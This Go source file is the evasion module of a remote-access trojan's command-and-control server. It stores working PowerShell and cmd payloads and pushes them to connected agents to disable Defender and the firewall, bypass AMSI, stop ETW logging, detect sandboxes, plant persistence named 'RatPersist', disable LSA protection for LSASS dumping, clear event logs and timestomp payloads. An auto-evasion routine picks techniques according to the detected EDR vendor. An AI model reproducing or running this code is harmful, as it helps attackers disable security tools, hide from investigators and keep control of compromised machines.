package evasion

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
	"github.com/jmoiron/sqlx"

	"chemicalumbra.dev/server/pkg/agent"
)

type EvasionTechnique struct {
	ID          string `json:"id"`
	Name        string `json:"name"`
	Category    string `json:"category"` // av, edr, amsi, etw, defender, firewall, sandbox
	Description string `json:"description"`
	Platform    string `json:"platform"` // windows, linux, both
	Risk        string `json:"risk"`     // low, medium, high
	Code        string `json:"code"`     // PowerShell/C#/Go code to execute
	Requires    string `json:"requires"` // admin, system, etc.
}

type Manager struct {
	db          *sqlx.DB
	agentMgr    *agent.Manager
	techniques  map[string]*EvasionTechnique
	mu          sync.RWMutex
	running     map[string]context.CancelFunc
}

func NewManager() *Manager {
	m := &Manager{
		techniques: make(map[string]*EvasionTechnique),
		running:    make(map[string]context.CancelFunc),
	}
	m.loadBuiltinTechniques()
	return m
}

func (m *Manager) SetDB(db *sqlx.DB) {
	m.db = db
}

func (m *Manager) SetAgentManager(am *agent.Manager) {
	m.agentMgr = am
}

func (m *Manager) loadBuiltinTechniques() {
	techniques := []*EvasionTechnique{
		// AV/EDR Evasion
		{
			ID:          "defender_exclusion_path",
			Name:        "Add Defender Path Exclusion",
			Category:    "defender",
			Description: "Add a path exclusion to Windows Defender",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `Add-MpPreference -ExclusionPath "C:\Path\To\Exclude"`,
		},
		{
			ID:          "defender_exclusion_extension",
			Name:        "Add Defender Extension Exclusion",
			Category:    "defender",
			Description: "Add a file extension exclusion to Windows Defender",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `Add-MpPreference -ExclusionExtension ".exe", ".dll", ".ps1"`,
		},
		{
			ID:          "defender_exclusion_process",
			Name:        "Add Defender Process Exclusion",
			Category:    "defender",
			Description: "Add a process exclusion to Windows Defender",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `Add-MpPreference -ExclusionProcess "C:\Windows\System32\wbem\WmiPrvSE.exe"`,
		},
		{
			ID:          "defender_disable_realtime",
			Name:        "Disable Defender Real-time Protection",
			Category:    "defender",
			Description: "Disable Windows Defender real-time monitoring",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `Set-MpPreference -DisableRealtimeMonitoring $true`,
		},
		{
			ID:          "defender_disable_behavior",
			Name:        "Disable Defender Behavior Monitoring",
			Category:    "defender",
			Description: "Disable Windows Defender behavior monitoring",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `Set-MpPreference -DisableBehaviorMonitoring $true`,
		},
		{
			ID:          "defender_disable_scripts",
			Name:        "Disable Defender Script Scanning",
			Category:    "defender",
			Description: "Disable Windows Defender script scanning",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `Set-MpPreference -DisableScriptScanning $true`,
		},
		{
			ID:          "defender_disable_ioav",
			Name:        "Disable Defender IO AV",
			Category:    "defender",
			Description: "Disable Windows Defender IO AV (scanning on read/write)",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `Set-MpPreference -DisableIOAVProtection $true`,
		},
		{
			ID:          "defender_disable_block_first",
			Name:        "Disable Defender Block at First Sight",
			Category:    "defender",
			Description: "Disable Windows Defender block at first sight",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `Set-MpPreference -SubmitSamplesConsent 2`,
		},
		{
			ID:          "defender_remove_definitions",
			Name:        "Remove Defender Definitions",
			Category:    "defender",
			Description: "Remove Windows Defender signatures (requires reboot to fully disable)",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "system",
			Code: `"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All`,
		},
		{
			ID:          "defender_tamper_protection",
			Name:        "Check/Disable Tamper Protection",
			Category:    "defender",
			Description: "Check tamper protection status and attempt to disable via registry",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "system",
			Code: `$tp = Get-MpComputerStatus | Select-Object IsTamperProtected; if ($tp.IsTamperProtected) { Write-Warning "Tamper Protection enabled - requires SYSTEM via PsExec" }`,
		},

		// AMSI Bypass
		{
			ID:          "amsi_patch_memory",
			Name:        "AMSI Patch (Memory)",
			Category:    "amsi",
			Description: "Patch AmsiScanBuffer in memory to bypass AMSI",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $field = $amsi.GetField('amsiInitFailed','NonPublic,Static'); $field.SetValue($null,$true)`,
		},
		{
			ID:          "amsi_patch_reflection",
			Name:        "AMSI Bypass via Reflection",
			Category:    "amsi",
			Description: "Disable AMSI using reflection on AmsiUtils",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `try { $a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils'); $b=$a.GetField('amsiInitFailed','NonPublic,Static'); $b.SetValue($null,$true) } catch { }`,
		},
		{
			ID:          "amsi_disable_registry",
			Name:        "Disable AMSI via Registry",
			Category:    "amsi",
			Description: "Disable AMSI for specific processes via registry",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `New-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\AMSI" -Name "Providers" -Value @{} -PropertyType MultiString -Force`,
		},

		// ETW Patching
		{
			ID:          "etw_patch_ntdll",
			Name:        "ETW Patch (NtTraceEvent)",
			Category:    "etw",
			Description: "Patch NtTraceEvent in ntdll.dll to disable ETW",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `$code = @"
using System;
using System.Runtime.InteropServices;
public class ETW {
    [DllImport("ntdll.dll")]
    public static extern int NtTraceEvent(IntPtr handle, uint level, ref Guid guid, IntPtr data);
}
"@; Add-Type $code; [ETW]::NtTraceEvent([IntPtr]::Zero, 0, [Guid]::Empty, [IntPtr]::Zero)`,
		},
		{
			ID:          "etw_disable_providers",
			Name:        "Disable ETW Providers",
			Category:    "etw",
			Description: "Disable common ETW providers used by EDR",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `logman stop "Microsoft-Windows-Threat-Intelligence" -ets 2>$null; logman stop "Microsoft-Windows-Windows Defender" -ets 2>$null; logman stop "Microsoft-Antimalware-Engine" -ets 2>$null`,

		},

		// Sandbox/VM Evasion
		{
			ID:          "sandbox_check_vm",
			Name:        "VM Detection",
			Category:    "sandbox",
			Description: "Check for VM artifacts (VMware, VirtualBox, Hyper-V, QEMU)",
			Platform:    "windows",
			Risk:        "low",
			Requires:    "user",
			Code: `$vm = Get-WmiObject Win32_ComputerSystem | Select-Object Manufacturer, Model; if ($vm.Manufacturer -match "VMware|VirtualBox|Microsoft Corporation|QEMU") { exit 1 }`,
		},
		{
			ID:          "sandbox_check_sandboxie",
			Name:        "Sandboxie Detection",
			Category:    "sandbox",
			Description: "Check for Sandboxie artifacts",
			Platform:    "windows",
			Risk:        "low",
			Requires:    "user",
			Code: `if (Test-Path "C:\Program Files\Sandboxie") { exit 1 }; if (Get-Process "SbieSvc" -ErrorAction SilentlyContinue) { exit 1 }`,
		},
		{
			ID:          "sandbox_check_analysis_tools",
			Name:        "Analysis Tools Detection",
			Category:    "sandbox",
			Description: "Check for common analysis tools (Process Monitor, Wireshark, etc.)",
			Platform:    "windows",
			Risk:        "low",
			Requires:    "user",
			Code: `$tools = @("procmon","procmon64","wireshark","fiddler","ida","ida64","x64dbg","x32dbg","ollydbg","windbg","dbgview","regmon","filemon","tcpview","procexp","procexp64","autoruns","autorunsc","procmon","sysmon"); foreach($t in $tools) { if (Get-Process $t -ErrorAction SilentlyContinue) { exit 1 } }`,

		},

		// Firewall Evasion
		{
			ID:          "firewall_disable",
			Name:        "Disable Windows Firewall",
			Category:    "firewall",
			Description: "Disable Windows Firewall for all profiles",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False`,
		},
		{
			ID:          "firewall_allow_outbound",
			Name:        "Allow Outbound Connections",
			Category:    "firewall",
			Description: "Create firewall rule to allow outbound for specific process",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `New-NetFirewallRule -DisplayName "Allow Outbound" -Direction Outbound -Action Allow -Program "C:\Path\To\Program.exe" -Enabled True`,
		},
		{
			ID:          "firewall_block_edr",
			Name:        "Block EDR Telemetry",
			Category:    "firewall",
			Description: "Block known EDR telemetry domains/IPs",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `$edrIPs = @("1.2.3.4", "5.6.7.8"); foreach($ip in $edrIPs) { New-NetFirewallRule -DisplayName "Block EDR $ip" -Direction Outbound -RemoteAddress $ip -Action Block }`,

		},

		// Persistence Evasion
		{
			ID:          "persistence_wmi_event",
			Name:        "WMI Event Subscription Persistence",
			Category:    "persistence",
			Description: "Create WMI event subscription for persistence",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `$filter = Set-WmiInstance -Namespace "root\subscription" -Class __EventFilter -Arguments @{Name="RatPersist"; EventNameSpace="root\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=0 AND TargetInstance.Minute=0"}; $consumer = Set-WmiInstance -Namespace "root\subscription" -Class CommandLineEventConsumer -Arguments @{Name="RatPersist"; CommandLineTemplate="C:\Path\To\Payload.exe"}; Set-WmiInstance -Namespace "root\subscription" -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer}`,
		},
		{
			ID:          "persistence_scheduled_task",
			Name:        "Scheduled Task Persistence",
			Category:    "persistence",
			Description: "Create scheduled task for persistence",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `$action = New-ScheduledTaskAction -Execute "C:\Path\To\Payload.exe"; $trigger = New-ScheduledTaskTrigger -AtStartup; Register-ScheduledTask -TaskName "Microsoft\Windows\RatTask" -Action $action -Trigger $trigger -RunLevel Highest -Force`,
		},
		{
			ID:          "persistence_registry_run",
			Name:        "Registry Run Key Persistence",
			Category:    "persistence",
			Description: "Add registry Run key for persistence",
			Platform:    "windows",
			Risk:        "low",
			Requires:    "user",
			Code: `Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RatAgent" -Value "C:\Path\To\Payload.exe"`,
		},
		{
			ID:          "persistence_com_hijack",
			Name:        "COM Hijack Persistence",
			Category:    "persistence",
			Description: "Hijack COM object for persistence",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "user",
			Code: `New-Item -Path "HKCU:\Software\Classes\CLSID\{BCDE0395-E52F-467C-8E3D-C4579291692E}\InprocServer32" -Force | Set-ItemProperty -Name "(default)" -Value "C:\Path\To\Payload.dll"`,
		},

		// Credential Access Evasion
		{
			ID:          "credguard_bypass",
			Name:        "Credential Guard Bypass",
			Category:    "credentials",
			Description: "Attempt to bypass Credential Guard for LSASS dumping",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "system",
			Code: `# Requires SYSTEM - use PsExec -s or token duplication
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "RunAsPPL" /t REG_DWORD /d 0 /f
# Then use comsvcs.dll or werfault.exe for LSASS dump`,

		},

		// Process Injection
		{
			ID:          "inject_classic",
			Name:        "Classic CreateRemoteThread Injection",
			Category:    "injection",
			Description: "Standard CreateRemoteThread injection",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_apc",
			Name:        "APC Queue Injection",
			Category:    "injection",
			Description: "QueueUserAPC injection technique",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_early_bird",
			Name:        "Early Bird APC Injection",
			Category:    "injection",
			Description: "Early Bird APC injection (create suspended, queue APC, resume)",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_thread_hijack",
			Name:        "Thread Hijacking",
			Category:    "injection",
			Description: "Hijack existing thread via SetThreadContext",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_hollowing",
			Name:        "Process Hollowing",
			Category:    "injection",
			Description: "Process hollowing (create suspended, unmap, write, resume)",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_doppelganging",
			Name:        "Process Doppelgänging",
			Category:    "injection",
			Description: "Process Doppelgänging (transacted NTFS)",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_ghosting",
			Name:        "Process Ghosting",
			Category:    "injection",
			Description: "Process Ghosting (delete-pending file)",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_ppid_spoof",
			Name:        "PPID Spoofing",
			Category:    "injection",
			Description: "Spoof parent process ID",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},
		{
			ID:          "inject_module_stomp",
			Name:        "Module Stomping",
			Category:    "injection",
			Description: "Overwrite legitimate module in memory",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `# Handled by agent's injection module`,
		},

		// Anti-Forensics
		{
			ID:          "forensics_clear_eventlogs",
			Name:        "Clear Event Logs",
			Category:    "forensics",
			Description: "Clear Windows event logs",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `wevtutil cl System; wevtutil cl Security; wevtutil cl Application`,
		},
		{
			ID:          "forensics_disable_audit",
			Name:        "Disable Audit Policies",
			Category:    "forensics",
			Description: "Disable audit policies to reduce logging",
			Platform:    "windows",
			Risk:        "high",
			Requires:    "admin",
			Code: `auditpol /set /category:* /success:disable /failure:disable`,
		},
		{
			ID:          "forensics_timestomp",
			Name:        "Timestomp File",
			Category:    "forensics",
			Description: "Modify file timestamps to match legitimate files",
			Platform:    "windows",
			Risk:        "medium",
			Requires:    "user",
			Code: `$ref = Get-Item "C:\Windows\System32\notepad.exe"; $target = Get-Item "C:\Path\To\Payload.exe"; $target.CreationTime = $ref.CreationTime; $target.LastWriteTime = $ref.LastWriteTime; $target.LastAccessTime = $ref.LastAccessTime`,
		},

		// Network Evasion
		{
			ID:          "network_domain_front",
			Name:        "Domain Fronting Setup",
			Category:    "network",
			Description: "Configure domain fronting for C2 traffic",
			Platform:    "both",
			Risk:        "medium",
			Requires:    "user",
			Code: `# Configured in C2 server config - agent uses SNI=legitimate.com, Host=malicious.com`,
		},
		{
			ID:          "network_tls_cert",
			Name:        "Custom TLS Certificate",
			Category:    "network",
			Description: "Use custom TLS certificate for C2",
			Platform:    "both",
			Risk:        "low",
			Requires:    "user",
			Code: `# Configured in C2 server config`,
		},
	}

	for _, t := range techniques {
		m.techniques[t.ID] = t
	}
}

func (m *Manager) GetTechniques(category string) []*EvasionTechnique {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var result []*EvasionTechnique
	for _, t := range m.techniques {
		if category == "" || t.Category == category {
			result = append(result, t)
		}
	}
	return result
}

func (m *Manager) GetTechnique(id string) (*EvasionTechnique, bool) {
	m.mu.RLock()
	defer m.mu.RUnlock()
	t, ok := m.techniques[id]
	return t, ok
}

func (m *Manager) ExecuteTechnique(ctx context.Context, agentID, techniqueID string) (string, error) {
	t, ok := m.GetTechnique(techniqueID)
	if !ok {
		return "", fmt.Errorf("technique not found: %s", techniqueID)
	}

	// Get agent
	agt, ok := m.agentMgr.Get(agentID)
	if !ok || agt.WSConn == nil {
		return "", fmt.Errorf("agent not connected")
	}

	// Send technique code to agent for execution
	taskID := uuid.New().String()
	msg := map[string]interface{}{
		"task_id": taskID,
		"command": "evasion",
		"args": map[string]string{
			"technique_id": techniqueID,
			"code":         t.Code,
		},
	}

	data, _ := json.Marshal(msg)
	err := m.agentMgr.Send(agentID, data)
	if err != nil {
		return "", err
	}

	// Wait for result
	resultChan := make(chan string, 1)
	m.registerResultHandler(taskID, resultChan)

	select {
	case <-ctx.Done():
		m.unregisterResultHandler(taskID)
		return "", ctx.Err()
	case result := <-resultChan:
		m.unregisterResultHandler(taskID)
		return result, nil
	case <-time.After(2 * time.Minute):
		m.unregisterResultHandler(taskID)
		return "", fmt.Errorf("timeout")
	}
}

var evasionResultHandlers = make(map[string]chan string)
var evasionResultMu sync.Mutex

func (m *Manager) registerResultHandler(taskID string, ch chan string) {
	evasionResultMu.Lock()
	evasionResultHandlers[taskID] = ch
	evasionResultMu.Unlock()
}

func (m *Manager) unregisterResultHandler(taskID string) {
	evasionResultMu.Lock()
	delete(evasionResultHandlers, taskID)
	evasionResultMu.Unlock()
}

func (m *Manager) HandleResult(taskID, output string) {
	evasionResultMu.Lock()
	ch, ok := evasionResultHandlers[taskID]
	evasionResultMu.Unlock()

	if ok {
		ch <- output
	}
}

// Generate evasion script for agent
func (m *Manager) GenerateAgentScript(techniqueIDs []string) string {
	var scripts []string
	for _, id := range techniqueIDs {
		if t, ok := m.techniques[id]; ok {
			scripts = append(scripts, fmt.Sprintf("# %s\n%s\n", t.Name, t.Code))
		}
	}
	return strings.Join(scripts, "\n")
}

// Check agent's AV/EDR status
func (m *Manager) CheckAVStatus(agentID string) (map[string]interface{}, error) {
	_, ok := m.agentMgr.Get(agentID)
	if !ok {
		return nil, fmt.Errorf("agent not found")
	}

	// Request AV info from agent
	taskID := uuid.New().String()
	msg := map[string]interface{}{
		"task_id": taskID,
		"command": "get_av",
		"args":    map[string]interface{}{},
	}

	data, _ := json.Marshal(msg)
	err := m.agentMgr.Send(agentID, data)
	if err != nil {
		return nil, err
	}

	resultChan := make(chan map[string]interface{}, 1)
	m.registerAVHandler(taskID, resultChan)

	select {
	case result := <-resultChan:
		m.unregisterAVHandler(taskID)
		return result, nil
	case <-time.After(30 * time.Second):
		m.unregisterAVHandler(taskID)
		return nil, fmt.Errorf("timeout")
	}
}

var avResultHandlers = make(map[string]chan map[string]interface{})
var avResultMu sync.Mutex

func (m *Manager) registerAVHandler(taskID string, ch chan map[string]interface{}) {
	avResultMu.Lock()
	avResultHandlers[taskID] = ch
	avResultMu.Unlock()
}

func (m *Manager) unregisterAVHandler(taskID string) {
	avResultMu.Lock()
	delete(avResultHandlers, taskID)
	avResultMu.Unlock()
}

func (m *Manager) HandleAVResult(taskID string, data map[string]interface{}) {
	avResultMu.Lock()
	ch, ok := avResultHandlers[taskID]
	avResultMu.Unlock()

	if ok {
		ch <- data
	}
}

// Auto-evasion: run a suite of techniques based on detected AV
func (m *Manager) AutoEvasion(ctx context.Context, agentID string) ([]string, error) {
	avInfo, err := m.CheckAVStatus(agentID)
	if err != nil {
		return nil, err
	}

	var results []string
	avProducts := []string{}

	if products, ok := avInfo["products"].([]string); ok {
		avProducts = products
	}

	// Determine which techniques to run based on detected AV
	techniquesToRun := m.selectTechniquesForAV(avProducts)

	for _, techID := range techniquesToRun {
		select {
		case <-ctx.Done():
			return results, ctx.Err()
		default:
			result, err := m.ExecuteTechnique(ctx, agentID, techID)
			results = append(results, fmt.Sprintf("%s: %v (err: %v)", techID, result, err))
			time.Sleep(2 * time.Second)
		}
	}

	return results, nil
}

func (m *Manager) selectTechniquesForAV(products []string) []string {
	var techniques []string

	for _, product := range products {
		product = strings.ToLower(product)

		switch {
		case strings.Contains(product, "defender") || strings.Contains(product, "windows defender"):
			techniques = append(techniques,
				"defender_exclusion_path",
				"defender_exclusion_extension",
				"defender_exclusion_process",
				"defender_disable_scripts",
				"amsi_patch_memory",
				"etw_patch_ntdll",
			)

		case strings.Contains(product, "crowdstrike"):
			techniques = append(techniques,
				"defender_exclusion_path",
				"amsi_patch_memory",
				"etw_patch_ntdll",
				"etw_disable_providers",
			)

		case strings.Contains(product, "sentinelone"):
			techniques = append(techniques,
				"defender_exclusion_path",
				"amsi_patch_memory",
				"etw_patch_ntdll",
			)

		case strings.Contains(product, "cortex") || strings.Contains(product, "traps"):
			techniques = append(techniques,
				"amsi_patch_memory",
				"etw_patch_ntdll",
			)

		case strings.Contains(product, "elastic") || strings.Contains(product, "endgame"):
			techniques = append(techniques,
				"amsi_patch_memory",
				"etw_disable_providers",
			)

		case strings.Contains(product, "carbonblack") || strings.Contains(product, "cb "):
			techniques = append(techniques,
				"amsi_patch_memory",
				"etw_patch_ntdll",
			)
		}
	}

	// Always add sandbox evasion
	techniques = append(techniques, "sandbox_check_vm", "sandbox_check_analysis_tools")

	// Deduplicate
	seen := make(map[string]bool)
	var unique []string
	for _, t := range techniques {
		if !seen[t] {
			seen[t] = true
			unique = append(unique, t)
		}
	}

	return unique
}